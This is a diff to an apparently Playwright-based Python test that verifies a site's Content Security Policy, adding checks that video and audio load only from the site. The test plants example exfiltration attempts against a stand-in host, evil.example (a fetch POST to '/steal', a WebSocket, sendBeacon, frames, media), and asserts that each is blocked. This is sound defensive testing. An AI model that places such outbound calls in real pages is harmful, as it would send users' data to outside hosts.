@@ -35,6 +35,7 @@ async def main():
     check("nothing may run text as code ('unsafe-eval' nowhere)", "'unsafe-eval'" not in csp and "'wasm-unsafe-eval'" not in csp)
     check('default-src none, frames none, objects none, base none, forms none', d.get('default-src') == ["'none'"] and d.get('frame-src') == ["'none'"] and d.get('object-src') == ["'none'"] and d.get('base-uri') == ["'none'"] and d.get('form-action') == ["'none'"])
     check('connections: the site, GitHub (Studio) and the five AI providers, nothing else', d.get('connect-src') == ["'self'", 'https://api.github.com', 'https://api.anthropic.com', 'https://api.openai.com', 'https://generativelanguage.googleapis.com', 'https://api.groq.com', 'https://openrouter.ai'], d.get('connect-src'))
+    check('video and captions: the site only', set(d.get('media-src', [])) == {"'self'", 'file:'}, d.get('media-src'))
     check('images and fonts: the site only (plus data: and blob: made in the page)', set(d.get('img-src', [])) <= {"'self'", 'data:', 'blob:', 'file:'} and set(d.get('font-src', [])) <= {"'self'", 'data:', 'file:'})
     check('a no-referrer policy', '<meta name="referrer" content="no-referrer" />' in head)
 
@@ -76,6 +77,8 @@ async def main():
           const f = document.createElement('iframe'); f.src = 'https://evil.example/'; host.appendChild(f);
           const f2 = document.createElement('iframe'); f2.srcdoc = "<script>parent.__x('srcdoc')<\\/script>"; host.appendChild(f2);
           const o = document.createElement('object'); o.data = 'https://evil.example/x.swf'; host.appendChild(o);
+          const vd = document.createElement('video'); vd.src = 'https://evil.example/x.mp4'; vd.preload = 'auto'; host.appendChild(vd);
+          const au = document.createElement('audio'); au.src = 'https://evil.example/x.mp3'; au.preload = 'auto'; host.appendChild(au);
           window.__fetch = fetch('https://evil.example/steal', { method:'POST', body:'x' }).then(() => 'sent', e => 'blocked');
           try { new WebSocket('wss://evil.example/'); window.__ws = 'opened'; } catch (e) { window.__ws = 'blocked'; }
           try { navigator.sendBeacon('https://evil.example/b', 'x'); } catch (e) {}
@@ -87,9 +90,9 @@ async def main():
         check('a planted javascript: link does not run', 'js-link' not in hits, hits)
         check('a planted frame does not run or load', 'srcdoc' not in hits, hits)
         check('a request to an outside host is refused', await pg.evaluate("() => window.__fetch") == 'blocked')
-        check('nothing reached an outside host (script, image beacon, frame, object, socket, beacon)', not outside, outside)
+        check('nothing reached an outside host (script, image beacon, frame, object, video, audio, socket, beacon)', not outside, outside)
         v = await pg.evaluate("() => (window.__viol || []).map(x => x.split(' ')[0])")
-        check('the browser reported each refusal as a policy violation', {'script-src-elem', 'img-src', 'frame-src', 'connect-src'} <= set(v), sorted(set(v)))
+        check('the browser reported each refusal as a policy violation (media included)', {'script-src-elem', 'img-src', 'frame-src', 'connect-src', 'media-src'} <= set(v), sorted(set(v)))
         check('no page errors', not errs, errs)
         await ctx.close()
 
